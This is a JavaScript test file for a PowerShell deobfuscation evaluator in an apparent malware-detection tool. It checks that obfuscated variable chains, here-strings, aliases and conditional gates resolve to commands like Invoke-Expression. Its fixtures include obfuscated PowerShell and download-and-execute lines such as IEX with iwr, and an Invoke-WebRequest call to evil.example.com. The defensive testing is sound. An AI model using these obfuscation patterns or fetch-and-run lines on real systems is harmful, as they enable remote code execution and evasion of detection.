'use strict';
// ════════════════════════════════════════════════════════════════════════════
// ps-mini-evaluator.test.js — Phase A (evaluator depth).
//
// Directly exercises `_findPsVariableResolutionCandidates` on
// src/decoders/ps-mini-evaluator.js. The existing PowerShell coverage in
// cmd-obfuscation-phase1.test.js and cmd-obfuscation.test.js targets
// regex-based sinks; nothing today pins the evaluator itself, despite it
// being the file behind every `&(…)` candidate. Phase A broadens the
// evaluator along seven axes and this file is its first-class regression
// test:
//
//   1. Bounded fixed-point iteration (multi-hop `$a='I'; $b='E'; $c=$a+$b`)
//   2. Here-strings — verbatim `@'…'@` and expandable `@"…"@`
//   3. Braced vars — `${name}` / `${env:NAME}`
//   4. Quote-pair collapse — `'i'+''+'e'+''+'x'`
//   5. Range operator — `N..M` (bounded to _PS_RANGE_MAX_ELEMENTS)
//   6. Alias table — `sal/Set-Alias/New-Alias` with literal targets
//   7. Failure-drop ordering — a later successful write must not be
//      clobbered by an earlier unresolvable one on the final pass.
//
// Mirrors the shape of cmd-obfuscation.test.js (vm.Context harness via
// tests/helpers/load-bundle.js, `host()` to cross the realm boundary for
// structural asserts).
// ════════════════════════════════════════════════════════════════════════════

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) { return host(cands.filter(pred)); }
function psVar(cands) { return pick(cands, c => /Variable Resolution/.test(c.technique)); }

// ── 1. Fixed-point iteration — multi-hop chains ─────────────────────────────

test('ps-mini: two-hop `$c = $a + $b; &($c)` resolves via fixed-point', () => {
  const text = "$a = 'Invoke'; $b = '-Expression'; $c = $a + $b; & ($c) 'whoami'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1, `expected hit; got ${JSON.stringify(hits)}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini: three-hop assignment chain still resolves', () => {
  // $e depends on $d depends on $c depends on $a+$b — exactly three hops,
  // which is at the boundary of _PS_MAX_FIXED_POINT_PASSES.
  const text = "$a='I'; $b='E'; $c=$a+$b; $d=$c+'X'; $e=$d+'-tail'; & ($e) arg";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /IEX-tail/);
});

test('ps-mini: unresolvable-then-resolvable same var keeps the newer write', () => {
  // The earlier RHS (`$unknown`) cannot resolve; the later one must win
  // on the final pass rather than being clobbered by `.delete()`.
  const text = "$x = $unknown; $x = 'Invoke-Expression'; & ($x) 'arg'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1, `expected hit; got ${JSON.stringify(hits)}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

// ── 2. Here-strings ─────────────────────────────────────────────────────────

test('ps-mini: verbatim here-string `@\'…\'@` resolves', () => {
  const text = "$x = @'\nInvoke-Expression\n'@\n& ($x)";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1, `expected hit; got ${JSON.stringify(hits)}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini: expandable here-string `@"…"@` interpolates $var', () => {
  const text = "$n = 'Invoke-Expression'; $x = @\"\n$n here\n\"@\n& ($x)";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression\s+here/);
});

test('ps-mini: here-string body containing `;` does not split the statement', () => {
  // An embedded `;` inside a verbatim here-string must NOT tokenise the
  // surrounding assignment in two. Regression test for _psSplitStatements.
  const text = "$x = @'\nInvoke-Expression;whoami\n'@\n& ($x)";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression;whoami/);
});

// ── 3. Braced variable syntax ───────────────────────────────────────────────

test('ps-mini: `${name}` braced var resolves in invocation', () => {
  const text = "$cmd = 'Invoke-Expression'; & (${cmd}) 'x'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini: `${env:NAME}` braced env-var works in assignment and ref', () => {
  const text = "${env:OBF} = 'powershell'; & (${env:OBF}) -NoProfile 'whoami'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /powershell/);
});

test('ps-mini: braced var inside double-quoted interpolation', () => {
  const text = '$n = \'Expression\'; $x = "Invoke-${n}"; & ($x)';
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

// ── 4. Quote-pair collapse ──────────────────────────────────────────────────

test("ps-mini: `'i'+''+'e'+''+'x'` collapses to `iex`", () => {
  const text = "$x = 'i'+''+'e'+''+'x'; & ($x) 'arg'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /iex/);
});

test('ps-mini: `"Inv"+""+"oke-Expression"` collapses via double-quoted empties', () => {
  const text = '$x = "Inv"+""+"oke-Expression"; & ($x)';
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

// ── 5. Range operator ───────────────────────────────────────────────────────

test('ps-mini: `65..68 -join \'\'` resolves to concatenated integer stringification', () => {
  // PowerShell actually outputs `656667`/`68` concatenation of the integer
  // representations when `-join ''` runs over an int range; the evaluator
  // reproduces that.
  const text = "$x = 65..68 -join ''; & ($x) 'arg'";
  // The call target '65666768' isn't a sensitive command, but the
  // candidate should still emit for the structural resolution.
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1, `expected hit; got ${JSON.stringify(hits)}`);
  assert.match(hits[0].deobfuscated, /65666768/);
});

test('ps-mini: range-operator cap blocks `0..100000`-style blowups', () => {
  // _PS_RANGE_MAX_ELEMENTS = 1024; 0..2000 is over the cap and must
  // return null (no candidate).
  const text = "$x = 0..2000 -join ','; & ($x)";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  // Either zero hits, or — if the call-operator path still fires — the
  // deobf must not contain a 6-digit comma-separated number (which would
  // mean the range actually expanded).
  for (const h of hits) {
    assert.ok(!/\d{5,}/.test(h.deobfuscated), `range cap leaked: ${h.deobfuscated}`);
  }
});

test('ps-mini: negative range `-1..-5` descends', () => {
  const text = "$x = -1..-5 -join ','; & ($x)";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /-1,-2,-3,-4,-5/);
});

// ── 6. Alias table ──────────────────────────────────────────────────────────

test('ps-mini: `sal x \'Invoke-Expression\'` aliases resolve in invocation', () => {
  const text = "sal xy 'Invoke-Expression'; & ($xy) 'payload'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini: `Set-Alias -Name y -Value \'IEX\'` form resolves', () => {
  const text = "Set-Alias -Name yy -Value 'IEX'; & ($yy) '(iwr http://x)'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /IEX/);
});

test('ps-mini: `New-Alias` form also registers', () => {
  const text = "New-Alias zz 'Invoke-WebRequest'; & ($zz) 'http://evil.example.com/p'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-WebRequest/);
});

test('ps-mini: alias with $var target resolves via fixed-point', () => {
  // Alias RHS is a $var that gets resolved on the same pass (or later).
  const text = "$t = 'Invoke-Expression'; sal xy $t; & ($xy) 'arg'";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

// ── 7. Cross-cutting: amp-budget invariant per Phase A candidate ────────────

test('ps-mini: fixed-point resolution stays within the 32x amp budget', () => {
  // A multi-hop chain where the final resolved value is short (<= 16 chars)
  // should never emit a candidate with `deobf.length > 32 * raw.length`.
  const text = "$a = 'Invoke'; $b = '-Expression'; $c = $a + $b; & ($c)";
  const hits = d._findPsVariableResolutionCandidates(text, {});
  for (const h of hits) {
    if (typeof h.deobfuscated === 'string' && typeof h.raw === 'string') {
      assert.ok(
        h.deobfuscated.length <= 32 * Math.max(1, h.raw.length),
        `amp violation: raw=${h.raw.length} deobf=${h.deobfuscated.length}`,
      );
    }
  }
});

// ── 8. [bool] typecast gate & `if` flattening ───────────────────────────────

test('ps-mini [bool] gate: truthy guard ([bool]1254) flattens body', () => {
  const text = "$g = [bool]1254\nif ($g) { $c = 'Invoke-Expression'; & $c 'whoami' }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1, `expected a flattened candidate; got ${hits.length}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini [bool] gate: falsy guard ([bool]0) drops body', () => {
  const text = "$g = [bool]0\nif ($g) { $c = 'Invoke-Expression'; & $c 'whoami' }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.equal(hits.length, 0);
});

test('ps-mini [bool] gate: chained negation (![bool]$null) evaluates truthy', () => {
  const text = "$g = ![bool]$null\nif ($g) { $c = 'IEX'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /IEX/);
});

test('ps-mini [bool] gate: comparison (N -eq N) truthy; (N -ne N) falsy', () => {
  const truthy = "$g = (9999 -eq 9999)\nif ($g) { $c = 'Invoke-Expression'; & $c }";
  const falsy  = "$g = (1 -ne 1)\nif ($g) { $c = 'Invoke-Expression'; & $c }";
  assert.ok(psVar(d._findPsVariableResolutionCandidates(truthy, {})).length >= 1);
  assert.equal(psVar(d._findPsVariableResolutionCandidates(falsy, {})).length, 0);
});

test('ps-mini [bool] gate: else branch taken when guard falsy', () => {
  const text = "$g = [bool]0\nif ($g) { $x = 'Foo' } else { $c = 'IEX'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /IEX/);
});

test('ps-mini [bool] gate: elseif branch takes first truthy', () => {
  const text = "$g = [bool]0\nif ($g) { $x = 'A' } elseif ([bool]1) { $c = 'Invoke-Expression'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('ps-mini [bool] gate: unresolvable guard leaves if-block intact', () => {
  // `$unknown` is never assigned in the source, so the guard is
  // unresolvable. The flattener must NOT drop the body silently —
  // it preserves the original `if` statement and the body never
  // becomes visible. The resolver consequently sees zero candidates
  // (the `& $c` never escapes the unresolved gate).
  const text = "if ($unknown) { $c = 'Invoke-Expression'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.equal(hits.length, 0);
});

test('ps-mini [bool] gate: single-element array [bool]@(0) evaluates falsy', () => {
  const text = "$g = [bool]@(0)\nif ($g) { $c = 'IEX'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.equal(hits.length, 0);
});

test('ps-mini [bool] gate: non-empty string literal evaluates truthy', () => {
  const text = "$g = [bool]'nonempty'\nif ($g) { $c = 'Invoke-Expression'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.ok(hits.length >= 1);
});

test('ps-mini [bool] gate: empty string [bool]\'\' evaluates falsy', () => {
  const text = "$g = [bool]''\nif ($g) { $c = 'IEX'; & $c }";
  const hits = psVar(d._findPsVariableResolutionCandidates(text, {}));
  assert.equal(hits.length, 0);
});
